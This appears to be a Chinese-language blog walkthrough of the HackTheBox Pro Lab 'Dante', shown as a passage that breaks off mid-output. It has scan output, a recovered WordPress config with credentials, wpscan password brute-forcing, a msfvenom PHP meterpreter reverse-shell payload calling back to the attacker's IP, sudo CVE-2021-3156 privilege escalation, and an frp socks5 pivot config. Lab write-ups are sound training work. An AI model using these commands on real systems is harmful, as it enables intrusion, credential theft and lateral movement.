<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>HTB Pro_Labs Dante打靶记录</title>
    <url>/2025/03/11/HTB%20Pro_Labs%20Dante%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="HTB-Pro-Labs-Dante打靶记录"><a href="#HTB-Pro-Labs-Dante打靶记录" class="headerlink" title="HTB Pro_Labs Dante打靶记录"></a>HTB Pro_Labs Dante打靶记录</h1><h2 id="外网部分"><a href="#外网部分" class="headerlink" title="外网部分"></a>外网部分</h2><p>入口点是10.10.110.0&#x2F;24，我们先扫描开放的IP</p>
<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali]
└─# nmap -sn 10.10.110.0&#x2F;24                       
Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2025-02-10 01:15 EST
Nmap scan report for 10.10.110.2
Host is up (0.43s latency).
Nmap scan report for 10.10.110.100
Host is up (0.31s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 33.42 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后扫描下<code>10.10.110.100</code>这个ip,看下结果</p>
<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali]
└─# nmap -A 10.10.110.100  
Nmap scan report for 10.10.110.100
Host is up (0.46s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
21&#x2F;tcp    open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can&#39;t get directory listing: PASV IP 172.16.1.100 is not the same as 10.10.110.100
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.17.141
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22&#x2F;tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8f:a2:ff:cf:4e:3e:aa:2b:c2:6f:f4:5a:2a:d9:e9:da (RSA)
|   256 07:83:8e:b6:f7:e6:72:e9:65:db:42:fd:ed:d6:93:ee (ECDSA)
|_  256 13:45:c5:ca:db:a6:b4:ae:9c:09:7d:21:cd:9d:74:f4 (ED25519)
65000&#x2F;tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_&#x2F;wordpress DANTE&#123;Y0u_Cant_G3t_at_m3_br0!&#125;
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel

TRACEROUTE (using port 22&#x2F;tcp)
HOP RTT       ADDRESS
1   549.57 ms 10.10.16.1 (10.10.16.1)
2   549.66 ms 10.10.110.100 (10.10.110.100)

OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
Nmap done: 1 IP address (1 host up) scanned in 80.74 seconds
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后得到了第一个flag和端口信息，我们先访问web服务端口，扫描后发现一个&#x2F;wordpress路由</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250210152708431.png" alt="image-20250210152708431"></p>
<p>然后用wpsacn扫出一个<code>.wp-config.php.swp</code>文件</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250210152818666.png" alt="image-20250210152818666"></p>
<p>恢复后发现如下内容：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">面]
└─# cat /var/www/html/wordpress/wp-config.php 

<span class="token comment">&lt;!-- Good Job at Finding the VIM SWAP File! --></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */</span>

<span class="token comment">// ** MySQL settings - You can get this info from your web host ** //</span>
<span class="token comment">/** The name of the database for WordPress */</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'DB_NAME'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'wordpress'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">/** MySQL database username */</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'DB_USER'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'shaun'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">/** MySQL database password */</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'DB_PASSWORD'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'password'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">/** MySQL hostname */</span>
 <span class="token function">efine</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'DB_HOST'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'localhost'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/** Database Charset to use in creating database tables. */</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'DB_CHARSET'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'utf8mb4'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">/** The Database Collate type. Don't change this if in doubt. */</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'DB_COLLATE'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the &#123;@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'AUTH_KEY'</span><span class="token punctuation">,</span>         <span class="token string single-quoted-string">'`i4M-OPF-&amp;:y_o`cJ.v!|=W:a_Haij>II.mI+JOJmgG,e|T:~]=#X $y53~>r=zp'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'SECURE_AUTH_KEY'</span><span class="token punctuation">,</span>  <span class="token string single-quoted-string">'vRZ$$_BulH8-Pp%E%r0|r8Lf|2NCj~-po#AII#^IRKy]/gzjNb8bAH;Drr|-Mt0-'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'LOGGED_IN_KEY'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'*u#~mm(H.9I1%knh&#123;`7.]OlsF3zItg$i;RVd9oG3J&amp;i+#WrvdS&lt;S>nSBX&#123;S)G4y`'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'NONCE_KEY'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'v%/@I3c8yIm2q/_jtCa~if*?E&amp;mGe?CKE1.]|TOki8=acoL5]^xq&lt;x5AU2V*QNK&amp;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'AUTH_SALT'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'&lt;=y@F ]NRpB4b#aox6W&lt;K)#W`Jv~6n&lt;5!^@4Y[e` js&lt;j-&#125;$OcQl%1ynsgJCH?&amp;Z'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'SECURE_AUTH_SALT'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&#123;Xrv,GS#>7B(&#123;PjsgfyL&#125; 7ct1roDs5~keDYg2ae&#125;M6,e|+D#fVC(gA%O]&#123;Pz[Y]'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'LOGGED_IN_SALT'</span><span class="token punctuation">,</span>   <span class="token string single-quoted-string">'c.T.hZjD5E9$>&lt;n?9/uav|G_9&lt;U`^7n_cF0s1w[[|@Q:etFp&#125;7^=Qgl~H?I&#123;|a,A'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'NONCE_SALT'</span><span class="token punctuation">,</span>       <span class="token string single-quoted-string">'UAKOs%vl!RU S:reIECN^=uvXgV9PJSv(L4W+W.Q8]fR):P4Kk(@ML2&#125;crn?W)TB'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">/**#@-*/</span>

<span class="token comment">/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */</span>
<span class="token variable">$table_prefix</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'wp_'</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */</span>

<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'WP_HTTP_BLOCK_EXTERNAL'</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'AUTOMATIC_UPDATER_DISABLED'</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'WP_AUTO_UPDATE_CORE'</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'WP_DEBUG'</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'WP_DEBUG_LOG'</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/* That's all, stop editing! Happy publishing. */</span>

<span class="token comment">/** Absolute path to the WordPress directory. */</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span> <span class="token function">defined</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'ABSPATH'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'ABSPATH'</span><span class="token punctuation">,</span> <span class="token constant">__DIR__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">/** Sets up WordPress vars and included files. */</span>
<span class="token keyword">require_once</span> <span class="token constant">ABSPATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'wp-settings.php'</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>没什么用，数据库端口没有没有在外部开放，获得权限之后的后渗透或许有用，我们先修改wpsan的命令语句再次进行扫描：</p>
<p><code>wpscan --url http://10.10.110.100:65000/wordpress --enumerate</code>，扫描出如下结果</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250210180148651.png" alt="image-20250210180148651"></p>
<p>发现两个用户，<code>admin</code>和<code>james</code>两个用户，然后我们直接通过wpscan爆破下这两个账号，先通过cewl工具生成下密码<code>cewl http://10.10.110.100:65000/wordpress/index.php/languages-and-frameworks &gt; words.txt</code></p>
<p>然后爆破下<code>wpscan --url http://10.10.110.100:65000/wordpress --passwords /home/kali/桌面/words.txt</code></p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250210183203134.png" alt="image-20250210183203134"></p>
<p>最终得到了<code>james</code>的密码<code>Toyota</code>，我们用wpscan接着扫描：<code>wpscan --url http://10.10.110.100:65000/wordpress --enumerate ap,at,cb,dbe --user james --password Toyota </code>，没扫出啥东西，我们登陆看一下，发现在用户管理界面能够修改管理员的密码，我们修改后登陆下：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250210231144453.png" alt="image-20250210231144453"></p>
<p>登陆到管理员之后，我尝试了修改主题模板文件，发现php文件没法修改，然后上传插件，然后限制了大小导致无法上传，最后试过了修改插件文件，最后终于是成功了，通过msf反弹shell进行连接:</p>
<pre class="line-numbers language-none"><code class="language-none">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;10.10.17.141 lport&#x3D;4444 -o shell.php
use exploit&#x2F;multi&#x2F;handler
set payload php&#x2F;meterpreter&#x2F;reverse_tcp
set lhost 10.10.17.141
set lport 4444
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250211001511239.png" alt="image-20250211001511239"></p>
<p>然后就开始进行信息收集，再想办法提权，我们将漏洞扫描工具上传到服务器，然后扫描得到如下的提权漏洞：</p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;linux-exploit-suggester.sh

Available information:

Kernel version: 5.4.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 20.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

81 kernel space exploits
49 user space exploits

Possible Exploits:

cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2022-2586] nft_object UAF

   Details: https:&#x2F;&#x2F;www.openwall.com&#x2F;lists&#x2F;oss-security&#x2F;2022&#x2F;08&#x2F;29&#x2F;5
   Exposure: probable
   Tags: [ ubuntu&#x3D;(20.04) ]&#123;kernel:5.12.13&#125;
   Download URL: https:&#x2F;&#x2F;www.openwall.com&#x2F;lists&#x2F;oss-security&#x2F;2022&#x2F;08&#x2F;29&#x2F;5&#x2F;1
   Comments: kernel.unprivileged_userns_clone&#x3D;1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-4034] PwnKit

   Details: https:&#x2F;&#x2F;www.qualys.com&#x2F;2022&#x2F;01&#x2F;25&#x2F;cve-2021-4034&#x2F;pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu&#x3D;10|11|12|13|14|15|16|17|18|19|20|21 ],debian&#x3D;7|8|9|10|11,fedora,manjaro
   Download URL: https:&#x2F;&#x2F;codeload.github.com&#x2F;berdav&#x2F;CVE-2021-4034&#x2F;zip&#x2F;main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https:&#x2F;&#x2F;www.qualys.com&#x2F;2021&#x2F;01&#x2F;26&#x2F;cve-2021-3156&#x2F;baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint&#x3D;19,[ ubuntu&#x3D;18|20 ], debian&#x3D;10
   Download URL: https:&#x2F;&#x2F;codeload.github.com&#x2F;blasty&#x2F;CVE-2021-3156&#x2F;zip&#x2F;main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https:&#x2F;&#x2F;www.qualys.com&#x2F;2021&#x2F;01&#x2F;26&#x2F;cve-2021-3156&#x2F;baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos&#x3D;6|7|8,[ ubuntu&#x3D;14|16|17|18|19|20 ], debian&#x3D;9|10
   Download URL: https:&#x2F;&#x2F;codeload.github.com&#x2F;worawit&#x2F;CVE-2021-3156&#x2F;zip&#x2F;main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https:&#x2F;&#x2F;google.github.io&#x2F;security-research&#x2F;pocs&#x2F;linux&#x2F;cve-2021-22555&#x2F;writeup.html
   Exposure: probable
   Tags: [ ubuntu&#x3D;20.04 ]&#123;kernel:5.8.0-*&#125;
   Download URL: https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;google&#x2F;security-research&#x2F;master&#x2F;pocs&#x2F;linux&#x2F;cve-2021-22555&#x2F;exploit.c
   ext-url: https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;bcoles&#x2F;kernel-exploits&#x2F;master&#x2F;CVE-2021-22555&#x2F;exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https:&#x2F;&#x2F;research.nccgroup.com&#x2F;2022&#x2F;09&#x2F;01&#x2F;settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250&#x2F;
https:&#x2F;&#x2F;blog.theori.io&#x2F;research&#x2F;CVE-2022-32250-linux-kernel-lpe-2022&#x2F;
   Exposure: less probable
   Tags: ubuntu&#x3D;(22.04)&#123;kernel:5.15.0-27-generic&#125;
   Download URL: https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;theori-io&#x2F;CVE-2022-32250-exploit&#x2F;main&#x2F;exp.c
   Comments: kernel.unprivileged_userns_clone&#x3D;1 required (to obtain CAP_NET_ADMIN)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们就直接利用sudo的存在的漏洞进行提权，直接用msf提就行，我们直接搜<code> CVE-2021-3156</code>，然后就能得到利用脚本，最后成功提权：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250211010435004.png" alt="image-20250211010435004"></p>
<p>然后就能得到第二个flag，第三个也在root文件夹中：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250211015022738.png" alt="image-20250211015022738"></p>
<p>然后查看路由，发现第二个ip段，我们上传fscan扫描下这个网段：</p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;fscan -h 172.16.1.0&#x2F;24 -np -no -nopoc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>扫描出结果如下：</p>
<pre class="line-numbers language-none"><code class="language-none">172.16.1.1:
    80 (HTTP)
    443 (HTTPS)

172.16.1.5:
    21 (FTP)
    139 (NetBIOS)
    445 (SMB)
    1433 (SQL Server)
    135 (Windows RPC)

172.16.1.10:
    22 (SSH)
    80 (HTTP)
    139 (NetBIOS)
    445 (SMB)

172.16.1.12:
    21 (FTP)
    22 (SSH)
    80 (HTTP)
    443 (HTTPS)
    3306 (MySQL)

172.16.1.13:
    80 (HTTP)
    443 (HTTPS)
    445 (SMB)

172.16.1.17:
    80 (HTTP)
    139 (NetBIOS)
    445 (SMB)
    10000 (Webmin)

172.16.1.19:
    80 (HTTP)
    8080 (Web，403 禁止访问)

172.16.1.20:
    22 (SSH)
    80 (HTTP)
    443 (HTTPS)
    139 (NetBIOS)
    445 (SMB)
    88 (Kerberos)
    135 (Windows RPC)

172.16.1.100:
    21 (FTP)
    22 (SSH)
    80 (HTTP)

172.16.1.101:
    21 (FTP)
    139 (NetBIOS)
    445 (SMB)
    135 (Windows RPC)

172.16.1.102:
    80 (HTTP)
    443 (HTTPS)
    139 (NetBIOS)
    445 (SMB)
    3306 (MySQL)
    135 (Windows RPC)
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后这段跟据这些就能开始内网的渗透了，先用frp配个代理出来：</p>
<pre class="line-numbers language-frpc.toml" data-language="frpc.toml"><code class="language-frpc.toml">serverAddr &#x3D; &quot;10.10.17.141&quot;		&#x2F;&#x2F;攻击机地址
serverPort &#x3D; 7000

[[proxies]]
name &#x3D; &quot;socks5&quot;
type &#x3D; &quot;tcp&quot;
remotePort &#x3D; 6021
[proxies.plugin]
type &#x3D; &quot;socks5&quot;

&#x2F;&#x2F;		.&#x2F;frpc -c frpc.toml    启动命令，在跳板机上运行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-frps.toml" data-language="frps.toml"><code class="language-frps.toml">[common]
bind_port &#x3D; 7000 &#x2F;&#x2F;在攻击机上运行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>然后就正常配好了代理，我们接下来进入后渗透</p>
<h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><p>我们拿goby仔细扫描下，结果如下：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250216174408476.png" alt="image-20250216174408476"></p>
<h3 id="172-16-1-10"><a href="#172-16-1-10" class="headerlink" title="172.16.1.10"></a>172.16.1.10</h3><p>扫描结果：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250216175719367.png" alt="image-20250216175719367"></p>
<p>没啥特殊的东西，访问下页面，也没啥特殊的东西，查看页面源代码，发现有一个地方像是文件包含，然后尝试下成功文件包含：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250211222134527.png" alt="image-20250211222134527"></p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250211222154567.png" alt="image-20250211222154567"></p>
<p>然后就继续向下利用，直接利用php的filter链写马即可：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250211224028970.png" alt="image-20250211224028970"></p>
<p>然后写个马，配个代理用蚁剑连一下就成功获取了第三个flag:<br><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250211231916110.png" alt="image-20250211231916110"></p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250211231926783.png" alt="image-20250211231926783"></p>
<p>然后上传正向连接木马来进行上线，这里如过直接使用msf的代理十分的不稳定，建议使用frp的代理，我在这里尝试了半天，死活msf的木马上不了线，算了，只能先提权，通过漏洞扫描脚本扫出如下漏洞：</p>
<pre class="line-numbers language-none"><code class="language-none">(www-data:&#x2F;var&#x2F;www&#x2F;html&#x2F;deerhost) $ .&#x2F;linux-exploit-suggester.sh
[1;37mAvailable information:[0m
Kernel version: [1;32m5.15.0[0m
Architecture: [1;32mx86_64[0m
Distribution: [1;32mubuntu[0m
Distribution version: [1;32m20.04[0m
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): [1;32mperformed[0m
Package listing: [1;32mfrom current OS[0m
[1;37mSearching among:[0m
81 kernel space exploits
49 user space exploits
[1;37mPossible Exploits:[0m
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [1;32m[CVE-2022-2586][0m nft_object UAF
   Details: https:&#x2F;&#x2F;www.openwall.com&#x2F;lists&#x2F;oss-security&#x2F;2022&#x2F;08&#x2F;29&#x2F;5
   Exposure: probable
   Tags: [0;93m[ ubuntu&#x3D;(20.04) ][0m&#123;kernel:5.12.13&#125;
   Download URL: https:&#x2F;&#x2F;www.openwall.com&#x2F;lists&#x2F;oss-security&#x2F;2022&#x2F;08&#x2F;29&#x2F;5&#x2F;1
   Comments: kernel.unprivileged_userns_clone&#x3D;1 required (to obtain CAP_NET_ADMIN)
[+] [1;32m[CVE-2022-0847][0m DirtyPipe
   Details: https:&#x2F;&#x2F;dirtypipe.cm4all.com&#x2F;
   Exposure: probable
   Tags: [0;93m[ ubuntu&#x3D;(20.04|21.04) ][0m,debian&#x3D;11
   Download URL: https:&#x2F;&#x2F;haxx.in&#x2F;files&#x2F;dirtypipez.c
[+][1;32m[CVE-2021-4034][0m PwnKit
   Details: https:&#x2F;&#x2F;www.qualys.com&#x2F;2022&#x2F;01&#x2F;25&#x2F;cve-2021-4034&#x2F;pwnkit.txt
   Exposure: probable
   Tags: [0;93m[ ubuntu&#x3D;10|11|12|13|14|15|16|17|18|19|20|21 ][0m,debian&#x3D;7|8|9|10|11,fedora,manjaro
   Download URL: https:&#x2F;&#x2F;codeload.github.com&#x2F;berdav&#x2F;CVE-2021-4034&#x2F;zip&#x2F;main
[+] [1;32m[CVE-2021-3156][0m sudo Baron Samedit
   Details: https:&#x2F;&#x2F;www.qualys.com&#x2F;2021&#x2F;01&#x2F;26&#x2F;cve-2021-3156&#x2F;baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint&#x3D;19,[0;93m[ ubuntu&#x3D;18|20 ][0m, debian&#x3D;10
   Download URL: https:&#x2F;&#x2F;codeload.github.com&#x2F;blasty&#x2F;CVE-2021-3156&#x2F;zip&#x2F;main
[+] [1;32m[CVE-2021-3156][0m sudo Baron Samedit 2
   Details: https:&#x2F;&#x2F;www.qualys.com&#x2F;2021&#x2F;01&#x2F;26&#x2F;cve-2021-3156&#x2F;baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos&#x3D;6|7|8,[0;93m[ ubuntu&#x3D;14|16|17|18|19|20 ][0m, debian&#x3D;9|10
   Download URL: https:&#x2F;&#x2F;codeload.github.com&#x2F;worawit&#x2F;CVE-2021-3156&#x2F;zip&#x2F;main
[+] [1;32m[CVE-2021-22555][0m Netfilter heap out-of-bounds write
   Details: https:&#x2F;&#x2F;google.github.io&#x2F;security-research&#x2F;pocs&#x2F;linux&#x2F;cve-2021-22555&#x2F;writeup.html
   Exposure: probable
   Tags: [0;93m[ ubuntu&#x3D;20.04 ][0m&#123;kernel:5.8.0-*&#125;
   Download URL: https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;google&#x2F;security-research&#x2F;master&#x2F;pocs&#x2F;linux&#x2F;cve-2021-22555&#x2F;exploit.c
   ext-url: https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;bcoles&#x2F;kernel-exploits&#x2F;master&#x2F;CVE-2021-22555&#x2F;exploit.c
   Comments: ip_tables kernel module must be loaded
[+] [1;32m[CVE-2022-32250][0m nft_object UAF (NFT_MSG_NEWSET)
   Details: https:&#x2F;&#x2F;research.nccgroup.com&#x2F;2022&#x2F;09&#x2F;01&#x2F;settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250&#x2F;
https:&#x2F;&#x2F;blog.theori.io&#x2F;research&#x2F;CVE-2022-32250-linux-kernel-lpe-2022&#x2F;
   Exposure: less probable
   Tags: ubuntu&#x3D;(22.04)&#123;kernel:5.15.0-27-generic&#125;
   Download URL: https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;theori-io&#x2F;CVE-2022-32250-exploit&#x2F;main&#x2F;exp.c
